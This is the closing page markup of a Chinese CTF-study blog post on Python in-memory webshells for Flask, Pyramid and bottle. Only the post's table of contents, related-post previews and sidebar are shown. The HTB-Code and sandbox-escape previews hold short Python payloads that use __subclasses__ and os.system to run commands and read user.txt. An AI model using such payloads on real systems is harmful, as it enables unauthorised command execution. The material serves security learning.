href="/tags/CTF%E5%AD%A6%E4%B9%A0/">CTF学习</a></div><div class="post-share"><div class="social-share" data-image="/img/2233.JPG" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/04/14/TGCTF2025-WEB/" title="TGCTF2025-WEB WP"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">TGCTF2025-WEB WP</div></div><div class="info-2"><div class="info-item-1">AAA偷渡阴平123456789&lt;?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ...</div></div></div></a><a class="pagination-related" href="/2025/04/24/HTB-Practice/" title="HTB-Code"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">HTB-Code</div></div><div class="info-2"><div class="info-item-1">HTB-codeusernmap扫描 nmap 10.10.11.62 -sV -A 发现开放了5000端口 访问发现是个在线执行python代码的网页 可以进行命令执行 print(&#39;&#39;.__class__.__base__.__subclasses__()[317](&#39;ls /&#39;,shell=True,stdout=-1).communicate()[0].strip()) 然后直接在上层目录读到user.txt print(&#39;&#39;.__class__.__base__.__subclasses__()[317](&#39;cat ../user.txt&#39;,shell=True,stdout=-1).communicate()[0].strip()) root命令执行 123print(&#x27;&#x27;.__class__.__base__.__subclasses__()[317](&#x27;ls...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/04/27/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/" title="CBC字节翻转攻击"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-04-27</div><div class="info-item-2">CBC字节翻转攻击</div></div><div class="info-2"><div class="info-item-1">CBC加密和解密过程 加密过程CBC加密流程：  准备  将明文按固定长度（通常是块大小，比如AES是128位）分块。 如果最后一块不足长度，需要填充（padding）。 选一个初始化向量（IV），它的长度跟分块大小相同。   加密每一块（第 i 块）  第1步：用当前明文块 PiP_iPi 和前一块密文（或IV）做异或（XOR）。  第一个块是$$C_0&#x3D;Ek(P0⊕IV)$$   第2步：将异或后的结果送入加密算法（E_k）（比如AES）加密，得到当前块的密文 Ci。  第3步：当前的密文块 CiC_iCi 会作为下一块明文的XOR对象。    循环处理每一块，直到全部加密完成。   解密过程1解密过程刚好相反，第一组密文在解密之后与初始向量IV异或得到第一组明文。第二组密文解密之后和第一组密文异或得到第二组明文。也就是说，解密一组明文需要本组和前一组的密文。  特点加密算法的输入是上一个密文分组和下一个明文分组的异或 EXB模式和CBC模式 CBC字节翻转攻击CBC字节翻转攻击的核心原理是通过破坏一个比特的密文来篡改一个比特的明文。 $$由题目得...</div></div></div></a><a class="pagination-related" href="/2025/04/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="pickle反序列化学习"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-04-10</div><div class="info-item-2">pickle反序列化学习</div></div><div class="info-2"><div class="info-item-1">前置知识详细前置知识可以看官方文档https://docs.python.org/zh-cn/3/library/pickle.html Pickle–Python对象反序列化Pickle1234pickle是python里一个可以对一个 Python 对象结构的二进制序列化和反序列化的模块。&quot;pickling&quot; 是将 Python 对象及其所拥有的层次结构转化为一个字节流的过程，而 &quot;unpickling&quot; 是相反的操作pickel可以看作一种独立的栈语言，其对opcode的编写可以进行python代码执行、变量覆盖等操作。  pickle序列化和反序列化对象 &lt;–&gt; 二进制字节流  12345678910111213import pickle class Person():    def __init__(self):        self.age=18        self.name=&quot;A&quot; p=Person()opcode=pickle.dumps(p)print(opcode)...</div></div></div></a><a class="pagination-related no-desc" href="/2025/04/10/python%E7%9B%B2%E6%B3%A8%E7%BB%93%E5%90%88%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0/" title="python盲注结合沙箱逃逸学习"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-04-10</div><div class="info-item-2">python盲注结合沙箱逃逸学习</div></div></div></a><a class="pagination-related" href="/2025/05/11/%E5%88%9D%E5%AD%A6%E6%A0%88%E5%B8%A7%E9%80%83%E9%80%B8/" title="栈帧逃逸"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-11</div><div class="info-item-2">栈帧逃逸</div></div><div class="info-2"><div class="info-item-1">初学栈帧逃逸栈帧介绍在 Python 中，栈帧（Stack Frame） 是函数调用时在内存中分配的一个数据结构，用于存储函数的运行信息（如局部变量、参数、返回地址等）。它是 Python 解释器管理函数调用和执行流程的核心机制之一，尤其在递归、异常处理和调试时非常重要。 栈帧（stack frame），也称为帧（frame），是用于执行代码的数据结构。每当 Python 解释器执行一个函数或方法时，都会创建一个新的栈帧，用于存储该函数或方法的局部变量、参数、返回地址以及其他执行相关的信息。这些栈帧会按照调用顺序被组织成一个栈，称为调用栈。 栈帧运作原理123456789def foo(a, b):    c = a + b    bar(c)def bar(x):    y = x * 2    print(y)foo(3, 4)  栈帧变化： 1.调用 foo(3, 4)：创建 foo 函数的栈帧，压入调用栈。foo 函数的局部变量表包含 a&#x3D;3, b&#x3D;4。 2.执行 c &#x3D; a + b：在 foo 的操作数栈上计算 a + b，将结果 7...</div></div></div></a><a class="pagination-related" href="/2025/04/06/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" title="Node.js原型链污染学习"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-04-06</div><div class="info-item-2">Node.js原型链污染学习</div></div><div class="info-2"><div class="info-item-1">原型链污染学习链接：https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html?page=1 node.jsjs创建对象的形式1.普通创建12var name=&#123;name:&#x27;sauy&#x27;,&#x27;age&#x27;:&#x27;19&#x27;&#125;var person=&#123;&#125;  2.构造函数方法创建12345678910function person()&#123;    this.name=&#x27;sauy&#x27;;    this.test=function ()&#123;        return 23333;    &#125;&#125;person.prototype.a=3;web=new person();console.log(web.test());console.log(web.a)  3.通过object创建123var a=new...</div></div></div></a><a class="pagination-related" href="/2025/05/12/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" title="python沙箱逃逸"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-12</div><div class="info-item-2">python沙箱逃逸</div></div><div class="info-2"><div class="info-item-1">前言Q1：什么是沙箱？沙箱是一种安全机制，在限制的环境中运行不受信任的代码。python中沙箱主要用于限制python，防止执行命令或者进行一些危险的行为。 Q2：什么是沙箱绕过？就是怎么绕过沙箱对我们的限制，拿到危险函数，最终来执行命令的过程。 目的对于python沙箱绕过，我们最终可能要实现的想法有如下: ·绕过限制 执行命令 ·写文件到指定位置 绕过方式import方式的绕过 import xxx from xxx import * __import__(&#39;xxx&#39;)  使用其他的方式来导入包名12345678910__import__(&#x27;os&#x27;).__dict__[&quot;system&quot;](&#x27;whoami&#x27;)#python2 and python3__import__(&#x27;&#x27;.decode.(&#x27;base64&#x27;)).getoutput(&#x27;pwd&#x27;)#python2import importlibx =...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/2233.JPG" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Sauy</div><div class="author-info-description">VENI,VEDI,VICI</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">17</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://space.bilibili.com/415414982"><i class="/img/bilibili.ico"></i><span>Follow Me!</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">前言：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Python%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number"></span> <span class="toc-text">Python内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Flask%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">Flask内存马注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%81%E7%89%88flask%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.</span> <span class="toc-text">老版flask内存马注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%EF%BC%9A%E4%BB%8E%E4%B8%8B%E9%9D%A2%E4%B8%80%E7%9B%B4%E5%88%B0%E6%9E%84%E9%80%A0webshell-%E9%83%BD%E6%98%AF%E5%89%8D%E8%A8%80%E7%9F%A5%E8%AF%86-%E4%B8%BA%E4%BA%86%E8%AE%A9%E4%BD%A0%E6%9B%B4%E5%A5%BD%E7%90%86%E8%A7%A3-%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84payload"><span class="toc-number">1.1.1.</span> <span class="toc-text">注意：从下面一直到构造webshell 都是前言知识 为了让你更好理解 内存马的payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#add-url-ruel%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.1.2.</span> <span class="toc-text">add_url_ruel介绍</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.3.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#lambada%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">1.1.4.</span> <span class="toc-text">lambada表达式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Flask%E4%B8%8A%E4%B8%8B%E6%96%87%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6"><span class="toc-number">1.1.5.</span> <span class="toc-text">Flask上下文管理机制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E4%B8%8A%E4%B8%8B%E6%96%87-request-context"><span class="toc-number">1.1.6.</span> <span class="toc-text">请求上下文 (request context)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BA%94%E7%94%A8%E4%B8%8A%E4%B8%8B%E6%96%87-application-context"><span class="toc-number">1.1.7.</span> <span class="toc-text">应用上下文 (application context)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E4%B8%A4%E4%B8%AA%E6%A0%88"><span class="toc-number">1.1.8.</span> <span class="toc-text">核心两个栈</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#eval%E7%94%A8%E6%B3%95eval-expression-globals-None-locals-None"><span class="toc-number">1.1.9.</span> <span class="toc-text">eval用法eval(expression, globals&#x3D;None, locals&#x3D;None)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E5%86%99%E6%B3%95"><span class="toc-number">1.1.10.</span> <span class="toc-text">内存马写法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B0%E7%89%88flask%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.</span> <span class="toc-text">新版flask内存马注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#app-before-request"><span class="toc-number">1.2.1.</span> <span class="toc-text">@app.before_request</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#app-after-request"><span class="toc-number">1.2.2.</span> <span class="toc-text">@app.after_request</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pyamid%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.3.</span> <span class="toc-text">Pyamid内存马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%A0%88%E5%B8%A7%E6%89%93Pyramid-WEB%E6%A1%86%E6%9E%B6%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.4.</span> <span class="toc-text">利用栈帧打Pyramid WEB框架下的内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%88%E5%B8%A7"><span class="toc-number">1.4.1.</span> <span class="toc-text">栈帧</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.4.2.</span> <span class="toc-text">构造内存马</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bottle%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.5.</span> <span class="toc-text">bottle内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E7%9B%B4%E6%8E%A5%E7%BB%91%E5%AE%9A%E8%B7%AF%E7%94%B1"><span class="toc-number">1.5.1.</span> <span class="toc-text">1.直接绑定路由</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8%E6%8A%A5%E9%94%99%E7%95%8C%E9%9D%A2-%E6%B1%A1%E6%9F%93%E6%8A%A5%E9%94%99%E7%95%8C%E9%9D%A2"><span class="toc-number">1.5.2.</span> <span class="toc-text">2.利用报错界面 污染报错界面</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%88%A9%E7%94%A8add-hook"><span class="toc-number">1.5.3.</span> <span class="toc-text">3.利用add_hook</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E8%AF%AD"><span class="toc-number">2.</span> <span class="toc-text">结语</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/06/29/2025%E5%B9%B4%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9BPolarCTF-WEB/" title="2025年夏季个人挑战赛PolarCTF-WEB">2025年夏季个人挑战赛PolarCTF-WEB</a><time datetime="2025-06-29T09:24:58.000Z" title="发表于 2025-06-29 17:24:58">2025-06-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/06/09/BUU-%E5%88%B7%E9%A2%98/" title="web刷题——持续更新">web刷题——持续更新</a><time datetime="2025-06-09T09:20:58.000Z" title="发表于 2025-06-09 17:20:58">2025-06-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/12/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" title="python沙箱逃逸">python沙箱逃逸</a><time datetime="2025-05-12T05:50:58.000Z" title="发表于 2025-05-12 13:50:58">2025-05-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/11/%E5%88%9D%E5%AD%A6%E6%A0%88%E5%B8%A7%E9%80%83%E9%80%B8/" title="栈帧逃逸">栈帧逃逸</a><time datetime="2025-05-11T06:50:58.000Z" title="发表于 2025-05-11 14:50:58">2025-05-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/05/2025-05-05-HTB-Heal/" title="HTB-Heal">HTB-Heal</a><time datetime="2025-05-05T09:20:58.000Z" title="发表于 2025-05-05 17:20:58">2025-05-05</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 By Sauy</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.0-b1</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
